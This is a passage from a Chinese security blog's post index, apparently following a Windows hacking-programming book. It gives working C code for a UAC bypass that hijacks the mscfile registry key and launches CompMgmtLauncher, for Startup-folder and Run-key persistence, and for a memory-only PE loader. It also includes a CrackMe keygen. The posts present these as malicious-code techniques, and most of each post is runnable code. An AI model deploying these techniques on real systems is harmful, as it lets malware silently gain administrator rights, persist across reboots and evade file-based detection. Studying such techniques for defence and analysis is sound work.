参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"隐藏技术","slug":"隐藏技术","permalink":"https://b1ack1e.github.io/tags/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/"}]},{"title":"提权技术-Bypass UAC","slug":"提权技术-Bypass UAC","date":"2021-07-20T06:24:40.000Z","updated":"2021-07-27T08:46:01.758Z","comments":true,"path":"2021/07/20/提权技术-Bypass UAC/","link":"","permalink":"https://b1ack1e.github.io/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/","excerpt":"","text":"Bypass UACUAC（UserAccount Control，用户账户控制）是微软在VISTA之后的版本中引入的一种安全机制，通过UAC，应用程序和任务可以始终在非管理员账户的安全上下文中运行，除非特别授予管理员级别的系统访问权限。UAC可以阻止未经授权的应用程序自动进行安装，并防止无意地更改系统设置。 正常UAC是有一个弹窗提示，而病毒木马为了隐藏自己，就需要不通知用户的情况下“偷偷“将自己提升为管理员权限。 在Windows中，一些高权限的程序在运行时，是不需要弹出UAC的。这些白名单程序，默认就是以管理员权限运行。可以通过DLL劫持、注入或者是修改注册表执行命令的方式启动目标程序，实现Bypass UAC提权操作。 下面拿白名单程序CompMgmtLauncher来进行一下分析。 分析CompMgmtLauncher启动过程打开procmon工具来监控CompMgmtLauncher启动。可以看到，它会读取HKCU\\Software\\Classes\\mscfile\\shell\\open\\command中的值。 可以看一下，此路径中存在什么，可以看到其中没有值 如果该路径没有值，然后就会查询HKCR\\mscfile\\shell\\open\\command，查看其中的值，存储这mmc.exe进程的路径信息。 现在可以知道，当它启动时，会先查看HKCU\\Software\\Classes\\mscfile\\shell\\open\\command，那么如果在这里添加路径信息，CompMgmtLauncher就会启动它。 现在就修改注册表信息，在HKCU\\Software\\Classes\\mscfile\\shell\\open\\command添加需要提权的程序路径，再运行CompMgmtLauncher就可以完成Bypass UAC提权。 实现1234567891011121314151617181920212223#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main()&#123; PVOID OldValue = NULL; //关闭重定位 Wow64DisableWow64FsRedirection(&amp;OldValue); HKEY hKey = NULL; RegCreateKeyEx(HKEY_CURRENT_USER, &quot;Software\\\\Classes\\\\mscfile\\\\Shell\\\\Open\\\\Command&quot;, 0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &amp;hKey, NULL); if (hKey == NULL) &#123; printf(&quot;创建键值失败\\n&quot;); return FALSE; &#125; RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)&quot;C:\\\\Users\\\\b1ackie\\\\Desktop\\\\TestApc.exe&quot;, (strlen(&quot;C:\\\\Users\\\\b1ackie\\\\Desktop\\\\TestApc.exe&quot;) + 1)); RegCloseKey(hKey); system(&quot;CompMgmtLauncher.exe&quot;); Wow64RevertWow64FsRedirection(OldValue); system(&quot;pause&quot;); return 0;&#125; 这里需要提权的程序为桌面上的TestApc.exe，运行后查看效果。运行程序可以看到，testapc.exe直接运行。 使用procmon工具查看权限可以看到权限是高 正常启动查看权限可以看到是中。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"提权技术","slug":"提权技术","permalink":"https://b1ack1e.github.io/tags/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/"},{"name":"UAC","slug":"UAC","permalink":"https://b1ack1e.github.io/tags/UAC/"}]},{"title":"160CrackMe--002","slug":"160CrackMe-002","date":"2021-07-20T02:17:33.000Z","updated":"2021-07-20T02:28:03.719Z","comments":true,"path":"2021/07/20/160CrackMe-002/","link":"","permalink":"https://b1ack1e.github.io/2021/07/20/160CrackMe-002/","excerpt":"","text":"初探打开程序，看到提示输入name和serial，输入后，提示错误。 分析查壳，看到程序没有加壳，是用VB语言写的。 使用OD进行分析，搜索错误提示的字符串，可以直接定位到关键的跳转 开始分析生成serial的过程，首先是获取了name的长度然后将其乘以17CFB再加上name的第一个ASCII码，最后转为十进制字符串。 1234567891011121314151600402412 . 50 push eax ; /String = 0000000A ???00402413 . 8B1A mov ebx,dword ptr ds:[edx] ; |00402415 . FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBstr&gt;; \\__vbaLenBstr0040241B . 8BF8 mov edi,eax ; 获取输入的name长度传入edi以便运算0040241D . 8B4D E8 mov ecx,dword ptr ss:[ebp-0x18]00402420 . 69FF FB7C0100 imul edi,edi,0x17CFB ; 长度乘0x17CFB00402426 . 51 push ecx ; /String = 80020004 ???00402427 . 0F80 91020000 jo Afkayas_.004026BE ; |0040242D . FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;] ; \\rtcAnsiValueBstr00402433 . 0FBFD0 movsx edx,ax ; 获取输入的第一个ascii传给edx00402436 . 03FA add edi,edx ; 乘法后的结果加上第一个ascii00402438 . 0F80 80020000 jo Afkayas_.004026BE0040243E . 57 push edi ; MSVBVM50.__vbaStrCat0040243F . FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;] ; 计算结果转为字符串（十进制）00402445 . 8BD0 mov edx,eax00402447 . 8D4D E0 lea ecx,dword ptr ss:[ebp-0x20] 然后将计算出的结果与“AKA-”进行拼接，再获取serial进行比较。 1234567891011121300402510 &gt; \\8B45 E8 mov eax,dword ptr ss:[ebp-0x18] ; 输入的Serial00402513 . 8B4D E4 mov ecx,dword ptr ss:[ebp-0x1C] ; 计算后的结果00402516 . 8B3D 00414000 mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrC&gt;; MSVBVM50.__vbaStrCat0040251C . 50 push eax0040251D . 68 701B4000 push Afkayas_.00401B70 ; AKA-00402522 . 51 push ecx ; /String = 80020004 ???00402523 . FFD7 call edi ; \\将AKA- 与计算后的数值拼接起来00402525 . 8B1D 70414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrM&gt;; MSVBVM50.__vbaStrMove0040252B . 8BD0 mov edx,eax0040252D . 8D4D E0 lea ecx,dword ptr ss:[ebp-0x20]00402530 . FFD3 call ebx ; MSVBVM50.__vbaStrMove; &lt;&amp;MSVBVM50.__vbaStrMove&gt;00402532 . 50 push eax00402533 . FF15 28414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCmp&gt;&gt;; 比较 注册机编写根据分析的结果进行注册机编写 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;windows.h&gt;int main() &#123; printf(&quot;输入name\\n&quot;); char name[20]; gets_s(name, 20); int length = strlen(name); int num = length * 0x17CFB; num += name[0]; char* s1 = &quot;AKA-&quot;; char* serial = (char*)malloc(100); sprintf(serial, &quot;%s%d&quot;,s1,num); printf(&quot;用户名是%s\\n注册码是%s\\n&quot;,name, serial); return 0;&#125; 运行输入name:b1ackie，输出serial:AKA-682815。 输入正确的name和serial后，弹出正确提示","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/tags/CrackMe/"}]},{"title":"自启动技术-快速启动目录","slug":"自启动技术-快速启动目录","date":"2021-07-19T09:11:43.000Z","updated":"2021-07-27T08:45:47.743Z","comments":true,"path":"2021/07/19/自启动技术-快速启动目录/","link":"","permalink":"https://b1ack1e.github.io/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/","excerpt":"","text":"快速启动目录Windows带有快速启动目录，将需要自启的程序放入其中，就可以实现开机自启。 函数说明SHGetSpecialFolderPath获取指定的系统路径 123456BOOL SHGetSpecialFolderPath( HWND hwndOwner, LPSTR lpszPath, int nFolder, BOOL fCreate); hwndOwner：窗口所有者句柄 lpszPath：返回路径的缓冲区，该缓冲区带下至少为MAX_PATH nFolder：系统路径的CSIDL标识。 值 含义 CSIDL_BITBUCKET 桌面\\回收站 CSIDL_CONTROLS 我的电脑\\控制面板 CSIDL_DESKTOP 桌面 CSIDL_DRIVES 我的电脑 CSIDL_STARTUP 开始菜单\\程序\\启动 CSIDL_SYSTEM SYSTEM文件夹 CSIDL_WINDOWS WINDOWS目录 fCreate：指示文件夹不存在时是否要创建。为FALSE时则不创建，否则创建。 返回值：成功TRUE；失败FALSE。 具体实现获取系统的快速启动目录，然后将需要自启的程序放入快速启动目录中。 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;shlobj.h&gt;BOOL AutoRun(char* lpszSrcFilePath, char* lpszDestFileName) &#123; char szStartUpPath[MAX_PATH] = &#123; 0 &#125;; char szDestFilePath[MAX_PATH] = &#123; 0 &#125;; //获取快速启动目录 if (SHGetSpecialFolderPathA(NULL, szStartUpPath, CSIDL_STARTUP, TRUE) == FALSE) &#123; printf(&quot;获取系统路径失败\\n&quot;); return FALSE; &#125; //将数据写入指定的缓冲区 wsprintfA(szDestFilePath, &quot;%s\\\\%s&quot;, szStartUpPath, lpszDestFileName); //将文件内容拷贝到缓冲区 if (CopyFileA(lpszSrcFilePath, szDestFilePath, FALSE) == FALSE) &#123; printf(&quot;向快速启动目录写入失败\\n&quot;); return FALSE; &#125; return TRUE;&#125;int main() &#123; if (AutoRun(&quot;C:\\\\Users\\\\b1ackie\\\\Desktop\\\\TestApc.exe&quot;, &quot;TestApc.exe&quot;) == FALSE) &#123; printf(&quot;失败\\n&quot;); system(&quot;pause&quot;); exit(-1); &#125; printf(&quot;成功\\n&quot;); system(&quot;pause&quot;); return 0;&#125; 在物理机中运行一下此程序，火绒马上提醒 在虚拟机中运行此程序，提示成功，然后到快速启动目录中查看，即可看到自启程序 使用火绒剑进行查看，可以看到在windows的快速启动目录下，有TestApc.exe程序。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"自启动技术","slug":"自启动技术","permalink":"https://b1ack1e.github.io/tags/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"}]},{"title":"自启动技术-注册表","slug":"自启动技术-注册表","date":"2021-07-19T06:13:39.000Z","updated":"2021-07-27T08:46:52.910Z","comments":true,"path":"2021/07/19/自启动技术-注册表/","link":"","permalink":"https://b1ack1e.github.io/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/","excerpt":"","text":"注册表方式实现自启动实现开机自启动的方式有很多，其中修改注册表的方式是最为广泛的。 函数介绍RegOpenKeyEx打开一个指定的注册表键 1234567LSTATUS RegOpenKeyExA( HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult); hKey：打开注册表项的句柄。该句柄由RegCreateKeyEx或RegOpenKeyEx函数返回，或者它可以是以下预定义键之一： HKEY_CLASSES_ROOT HKEY_CURRENT_CONFIG HKEY_CURRENT_USER HKEY_LOCAL_MACHINE HKEY_USERS lpSubKey：将打开的注册表子项的名称 ulOptions：保留，必须设置为0 samDesired：对指定键希望得到的访问权限进行的访问标记。这个参数可以是下列值得组合 值 含义 KEY_CREATE_LINK 准许生成符号键 KET_CREATE_SUB_KEY 准许生成子键 KEY_ENUMERATE_SUB_KEYS 准许生成枚举子键 KEY_EXECUTE 准许进行读操作 KEY_NOTIFY 准许更换通告 KEY_QUERY_VALUE 准许查询子键 KEY_ALL_ACESS 提供完全访问，它是上面数值的组合 KEY_READ 是KEY_QUERY_VALUE,KEY_ENUMERATE_SUB_KEYS,KEY_NOTIFY的组合 KEY_SET_VALUE 准许设置子键的数值 KEY_WRITE 是KEY_SET_VALUE、KET_CREATE_SUB_KEY的组合 KEY_WOW64_32KEY 表示64位系统中的应用程序应该在32位注册表试图上运行。32位系统会忽略该标志。 KEY_WOW64_32KEY 表示64位系统的应用程序应该在64位注册表试图上运行。32位系统上忽略该标志。 phkResult：指向一个变量的指针，该变量保存打开注册表键的句柄。如果不再使用返回的句柄，则调用RegClose来关闭它。 返回值：如果成功，返回0；失败返回一个非零的错误代码。 RegSetValueEx函数在注册表项下设置指定值得数据和类型 12345678LSTATUS RegSetValueExA( HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData); hKey：指定一个已打开项的句柄，或一个标准项名。 lpValueName：指向一个字符串的指针，该字符串包含了与设置值的名称。若拥有该名称的值并不存在于指定的注册表中，则此函数会将其加入到该项。如果此值是NULL或指向空字符串，则此函数将会设置该项的默认值或未命名值得类型和数据。 Reserved：保留值，必须为0； dwType：指定将存储的数据类型，该参数可以为以下值之一。 值 含义 REG_BINARY 任何形式的二进制数据 REG_DWORD 一个32位的数字 REG_DWORD_LITTLE_ENDIAN 一个格式为“低字节在前”的32位数字 REG_DWORD_BIG_ENDIAN 一个格式为“高字节在前”的32位数字 REG_EXPAND_SZ 一个以0结尾的字符串，该字符串包含环境变量（如“%PATH”） REG_LINK 一个Unicode格式的带符号链接 REG_MULTI_SZ 一个以0结尾的字符串数组，该数组以链接两个0作为终止符 REG_ONE 未定义值类型 REG_RESOURCE_LIST 一个设备驱动器资源列表 REG_SZ 一个以0结尾的字符串 lpData：指向一个缓冲区，该缓冲区包含了为指定值名称存储的数据。 cbData：指定由lpData参数所指向的数据大小，单位是字节。 返回值：返回0表示陈成功；返回其他任何值都代表一个错误代码。 实现原理对于Windows来说，提供了专门的开机自启动注册表，每次开机时，它都会在这个注册表键下遍历键值，以获取键值中的程序路径，并创建进程启动程序。所以要想实现注册表开机自启动，只需要在这个注册表键下添加想要设置自启动的程序路径就可以了。 这里用最常见的RUN键来进行设置，该键位置是[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]和[HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 代码实现在HKEY_LOCAL_MACHINE下进行设置，这需要管理员运行权限。 123456789101112131415161718192021222324252627282930#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;BOOL Register(char* lpszFileName, char* lpszValueName) &#123; HKEY hKey; if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run&quot;, 0, KEY_WRITE, &amp;hKey) != 0) &#123; printf(&quot;打开注册表失败\\n&quot;); return FALSE; &#125; if (RegSetValueEx(hKey, lpszValueName, 0, REG_SZ, (BYTE*)lpszFileName, (lstrlen(lpszFileName) + 1)) != 0) &#123; printf(&quot;设置注册表值失败\\n&quot;); RegCloseKey(hKey); return FALSE; &#125; RegCloseKey(hKey); return TRUE;&#125;int main()&#123; if (Register(&quot;C:\\\\Users\\\\b1ackie\\\\Desktop\\\\Register.exe&quot;, &quot;b1ackie&quot;) == FALSE) &#123; printf(&quot;自启动失败\\n&quot;); system(&quot;pause&quot;); exit(-1); &#125; printf(&quot;自启动成功\\n&quot;); system(&quot;pause&quot;); return 0;&#125; 打开程序，提示自启动成功，说明注册表设置成功。 用regedit命令查看注册表相关信息，可以成功看到当前的注册表信息，注意图中路径的不同，这是因为重定位的原因。 也可以使用火绒剑，如图可以看到启动项的信息，现在重启计算机，就会自动启动了。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"自启动技术","slug":"自启动技术","permalink":"https://b1ack1e.github.io/tags/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"}]},{"title":"自启动技术-内存直接加载运行","slug":"自启动技术-内存直接加载运行","date":"2021-07-15T06:28:21.000Z","updated":"2021-07-27T08:46:45.018Z","comments":true,"path":"2021/07/15/自启动技术-内存直接加载运行/","link":"","permalink":"https://b1ack1e.github.io/2021/07/15/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/","excerpt":"","text":"内存直接加载运行内存直接加载运行就是，模拟PE加载器的功能，把DLL或者exe等PE文件从内存中直接加载到病毒木马的内存中去运行，不需要通过loadlibrary等现成的API函数去操作。 实现原理构造一个PE装载器，将PE文件加载到内存中。大致过程，首先要申请一块内存，然后将PE文件按照映像对齐大小映射到内存中；根据重定位表，重定位硬编码数据；获取导入表中的函数及其地址；如果是DLL，获取导出表的相关数据（EXE一般没有导出表）；获取入口点的地址，若为EXE，直接跳到入口点即可执行，DLL文件的话还需要构造一个DLLMAIN函数，实现DLL加载。 具体实现打开文件并且获取大小 12345678910111213char* FileName = &quot;C:\\\\Users\\\\Tophanter\\\\Desktop\\\\TestDll.dll&quot;;//打开文件HANDLE hFile = CreateFileA(FileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);//获取大小DWORD dwFileSize = GetFileSize(hFile, NULL);//申请内存空间PBYTE pData = new BYTE[dwFileSize];DWORD dwRet = 0;//将文件读取到内存中ReadFile(hFile, pData, dwFileSize, &amp;dwRet, NULL);CloseHandle(hFile); 获取sizeofimage12345678910/*获取PE文件的镜像大小，获取加载到内存后的大小* lpData内存中的基址*/DWORD GetImageSize(LPVOID lpData) &#123; DWORD dwSizeOfImage = 0; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpData; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); dwSizeOfImage = pNtHeaders-&gt;OptionalHeader.SizeOfImage; return dwSizeOfImage;&#125; 根据获取的sizeofimage，在进程中开辟一个内存块，权限可读可写可执行。 12LPVOID lpBaseAddr = VirtualAlloc(NULL, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);RtlZeroMemory(lpBaseAddr, dwImageSize); 重定位数据12345678910111213141516171819202122232425262728293031323334/*获取重定位表的相关数据并且重定位数据* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址*/BOOL DoRelocationTable(LPVOID lpBaseAddr) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); //获取重定位表 PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((unsigned long)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress); if ((PVOID)pReloc == (PVOID)pDosHeader) &#123; return TRUE; &#125; //开始扫描重定位表 while ((pReloc-&gt;VirtualAddress + pReloc-&gt;SizeOfBlock) != 0) &#123; //重定位表的头部加上sizeof(IMAGE_BASE_RELOCATION)就是重定位数据的开始 WORD* pRelocData = (WORD*)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION)); //获取需要重定位的数据的个数 int nNumberOfReloc = (pReloc-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); for (int i = 0; i &lt; nNumberOfReloc; i++) &#123; //高位是否为3，判断是否需要修复 if ((DWORD)(pRelocData[i] &amp; 0x0000F000) == 0x00003000) &#123; //获取需要重定位数据的地址 DWORD* pAddress = (DWORD*)((PBYTE)pDosHeader + pReloc-&gt;VirtualAddress + (pRelocData[i] &amp; 0x0FFF)); //修改重定位数据，公式：地址-旧基址+新基址，地址是pAddress中的值 DWORD dwDelta = (DWORD)pDosHeader - pNtHeaders-&gt;OptionalHeader.ImageBase; *pAddress += dwDelta; &#125; &#125; //继续处理下一组重定位数据 pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc-&gt;SizeOfBlock); &#125; return TRUE;&#125; 导入表1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/*获取导入表的相关数据* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址*/BOOL DoImportTable(LPVOID lpBaseAddr) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); //获取导入表地址 PIMAGE_IMPORT_DESCRIPTOR pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); // 循环遍历导入表中的DLL及获取导入表中的函数地址 char* lpDllName = NULL; HMODULE hDll = NULL; PIMAGE_THUNK_DATA lpImportNameArray = NULL; PIMAGE_IMPORT_BY_NAME lpImportByName = NULL; PIMAGE_THUNK_DATA lpImportFuncAddrArray = NULL; FARPROC lpFuncAddress = NULL; DWORD i = 0; while (TRUE) &#123; if (0 == pImportTable-&gt;OriginalFirstThunk) &#123; break; &#125; // 获取导入表中DLL的名称并加载DLL lpDllName = (char*)((DWORD)pDosHeader + pImportTable-&gt;Name); hDll = GetModuleHandleA(lpDllName); if (NULL == hDll) &#123; hDll = LoadLibraryA(lpDllName); if (NULL == hDll) &#123; pImportTable++; continue; &#125; &#125; i = 0; // 获取OriginalFirstThunk以及对应的导入函数名称表首地址 lpImportNameArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;OriginalFirstThunk); // 获取FirstThunk以及对应的导入函数地址表首地址 lpImportFuncAddrArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;FirstThunk); while (TRUE) &#123; if (0 == lpImportNameArray[i].u1.AddressOfData) &#123; break; &#125; // 获取IMAGE_IMPORT_BY_NAME结构 lpImportByName = (PIMAGE_IMPORT_BY_NAME)((DWORD)pDosHeader + lpImportNameArray[i].u1.AddressOfData); // 判断导出函数是序号导出还是函数名称导出 if (0x80000000 &amp; lpImportNameArray[i].u1.Ordinal) &#123; // 序号导出 // 当IMAGE_THUNK_DATA值的最高位为1时，表示函数以序号方式输入，这时，低位被看做是一个函数序号 lpFuncAddress = GetProcAddress(hDll, (LPCSTR)(lpImportNameArray[i].u1.Ordinal &amp; 0x0000FFFF)); &#125; else &#123; // 名称导出 lpFuncAddress = GetProcAddress(hDll, (LPCSTR)lpImportByName-&gt;Name); &#125; lpImportFuncAddrArray[i].u1.Function = (DWORD)lpFuncAddress; i++; &#125; pImportTable++; &#125; return TRUE;&#125; 修改ImageBase1234567//修改ImageBaseBOOL SetImage(LPVOID lpBaseAddr) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); pNtHeaders-&gt;OptionalHeader.SizeOfImage = (ULONG32)lpBaseAddr; return TRUE;&#125; 获取入口点如果是EXE，这一步，获取addressOfEntryPoint之后跳到入口点即可直接执行。 123456789BOOL Entry(LPVOID lpBaseAddr) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); LPVOID Entry = (LPVOID)((ULONG32)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint); __asm &#123; mov eax,Entry jmp eax &#125;&#125; 现在来测试一下直接运行一个EXE，测试文件为桌面上的TestProcess.exe。源代码如下： 12345#include &lt;stdio.h&gt;int main()&#123; printf(&quot;b1ackie!!!\\n&quot;); return 0;&#125; 运行程序查看效果，可以看到直接加载运行TestProcess.exe。 若是DLL文件，还需要构造一下DLLMAIN 123456789101112BOOL CallDllMain(LPVOID lpBaseAddr) &#123; typedef_DllMain DllMain = NULL; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); DllMain = (typedef_DllMain)((ULONG32)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint); BOOL bRet = DllMain((HINSTANCE)lpBaseAddr,DLL_PROCESS_ATTACH,NULL); if (bRet == NULL) &#123; printf(&quot;构造入口点失败\\n&quot;); return bRet; &#125; return bRet;&#125; 导出表123456789101112131415161718192021222324252627282930313233343536/*获取导出函数及其地址* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址* lpszFuncName：导出函数名字*/LPVOID GetExFuncAddr(LPVOID lpBaseAddr,char* lpszFuncName) &#123; LPVOID lpFunc = NULL; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); //获取导出表地址 PIMAGE_EXPORT_DIRECTORY pExportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); //从导出表取出的函数名 char* lpFuncName = NULL; //获取AddressOfNames PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNames); //获取AddressOfNameOrdinals PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNameOrdinals); //索引值 WORD wHint = 0; //获取AddressOfFunctions PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfFunctions); //获取所有根据名称导出的函数数量 DWORD dwNumberOfNames = pExportTable-&gt;NumberOfNames; for (int i = 0; i &lt; dwNumberOfNames; i++) &#123; lpFuncName = (PCHAR)((DWORD)pDosHeader + lpAddressOfNamesArray[i]); if (strcmpi(lpFuncName, lpszFuncName) == 0) &#123; //获取索引值 wHint = lpAddressOfNameOrdinalArray[i]; //根据索引值，在AddressOfFunctions中取出RVA lpFunc = (LPVOID)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]); break; &#125; &#125; //返回函数地址 return lpFunc;&#125; 运行加载桌面上的TestDll.dll文件，此DLL导出函数是一个messagebox函数。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"启动技术","slug":"启动技术","permalink":"https://b1ack1e.github.io/tags/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"},{"name":"PE","slug":"PE","permalink":"https://b1ack1e.github.io/tags/PE/"}]},{"title":"启动技术-创建进程API","slug":"启动技术-创建进程API","date":"2021-07-14T07:15:24.000Z","updated":"2021-07-27T08:45:58.648Z","comments":true,"path":"2021/07/14/启动技术-创建进程API/","link":"","permalink":"https://b1ack1e.github.io/2021/07/14/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/